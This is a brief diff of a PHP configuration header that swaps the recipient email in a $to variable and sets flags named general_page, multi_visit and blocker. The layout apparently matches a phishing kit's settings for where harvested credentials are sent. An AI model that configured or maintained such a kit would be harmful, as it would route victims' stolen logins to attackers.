@@ -1,5 +1,5 @@
 <?php
-$to = "traptrill@yandex.com";
+$to = "email777777122@yandex.com";
 $general_page = 1;
 $multi_visit = 0;
 $blocker = 1;
